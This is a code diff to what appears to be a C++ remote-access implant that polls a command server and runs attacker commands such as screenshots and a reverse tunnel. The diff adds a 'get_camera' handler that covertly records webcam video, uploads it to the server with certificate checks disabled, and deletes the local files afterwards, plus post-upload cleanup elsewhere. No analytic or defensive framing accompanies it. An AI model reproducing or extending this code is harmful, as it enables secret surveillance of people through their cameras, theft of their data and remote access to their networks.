@@ -10,7 +10,7 @@
 #include "ScreenCapture.h"
 #include "FileUtils.h" 
 #include "ctun.h"
-
+#include "camera.h"
 
 
 struct CommandInfo {
@@ -24,6 +24,7 @@ size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* out
     output->append(reinterpret_cast<const char*>(contents), totalSize);
     return totalSize;
 }
+
 
 std::string extractCsrfToken(const std::string& htmlContent) {
     std::regex regexPattern("<input type=\"hidden\" name=\"csrf_token\" value=\"([^\"]*)\">");
@@ -157,6 +158,7 @@ int main() {
         }
 
         CommandInfo commandInfo = extractCommandInfoFromJson(htmlContent);
+        
         if (commandInfo.command == "get_screenshot") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
             std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
@@ -198,6 +200,62 @@ int main() {
                 std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
             } else {
                 std::cout << "File uploaded successfully!" << std::endl;
+                
+                if (remove(compressedArchivePath.c_str()) == 0) {
+                    std::cout << "Compressed archive deleted successfully!" << std::endl;
+                } else {
+                    std::cerr << "Error deleting compressed archive!" << std::endl;
+                }
+            }
+            
+        } else if (commandInfo.command == "get_camera") {
+            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
+            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
+
+            detectCameras();
+            int cameraIndex = 1;  
+            std::chrono::seconds duration(10);    
+
+            recordVideo(cameraIndex, duration);
+            const char* outputArchiveNamePatternBMP = "*.avi";
+            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePatternBMP);
+
+            deleteFiles(outputArchiveNamePatternBMP);
+
+            std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
+
+            curl_easy_reset(curl);
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+            curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
+            curl_easy_setopt(curl, CURLOPT_POST, 1L);
+            curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);
+
+            struct curl_httppost* post = nullptr;
+            struct curl_httppost* last = nullptr;
+
+            curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, compressedArchivePath.c_str(), CURLFORM_END);
+            curl_formadd(&post, &last, CURLFORM_COPYNAME, "command", CURLFORM_COPYCONTENTS, commandInfo.command.c_str(), CURLFORM_END);
+            curl_formadd(&post, &last, CURLFORM_COPYNAME, "extra", CURLFORM_COPYCONTENTS, "", CURLFORM_END);
+            curl_formadd(&post, &last, CURLFORM_COPYNAME, "uuid", CURLFORM_COPYCONTENTS, commandInfo.uuid.c_str(), CURLFORM_END);
+            curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);
+
+            curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
+
+            res = curl_easy_perform(curl);
+
+            curl_formfree(post);
+
+            if (res != CURLE_OK) {
+                std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
+            } else {
+                std::cout << "File uploaded successfully!" << std::endl;
+
+                if (remove(compressedArchivePath.c_str()) == 0) {
+                    std::cout << "Compressed archive deleted successfully!" << std::endl;
+                } else {
+                    std::cerr << "Error deleting compressed archive!" << std::endl;
+                }
             }
             
         } else if (commandInfo.command == "rev_tun_port") {
@@ -217,8 +275,11 @@ int main() {
                 std::pair<std::string, int> tunnelAddress(adresseTunnel, portTunnel);
                 std::pair<std::string, int> forwardAddress(adresseForward, portForward);
 
-                TunnelingClient tunnelingClient(tunnelAddress, forwardAddress);
-                tunnelingClient.startTunneling();
+                TunnelingClient* tunnelingClient = new TunnelingClient(tunnelAddress, forwardAddress);
+                tunnelingClient->startTunneling();
+                
+                tunnelingClient->closeTunnels();
+                delete tunnelingClient;
 
                 return 0;
             } else {
@@ -230,8 +291,6 @@ int main() {
         }
 
         curl_easy_cleanup(curl);
-
-        // Pause for 3 minutes before the next iteration
         std::this_thread::sleep_for(std::chrono::minutes(3));
     }
 
